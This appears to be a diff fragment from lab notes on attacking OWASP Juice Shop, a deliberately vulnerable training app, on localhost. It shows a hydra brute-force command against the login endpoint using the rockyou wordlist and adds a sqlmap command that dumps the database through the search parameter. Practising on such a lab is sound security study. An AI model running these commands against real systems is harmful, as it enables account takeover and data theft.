@@ -19,3 +19,5 @@ http://localhost:3000/#/login
 hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \
 http-post-form "http://localhost:3000/rest/user/login:\
 {\"email\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid email or password." -t 4
+
+sqlmap -u "http://localhost:3000/rest/products/search?q=searchterm" --batch --dump
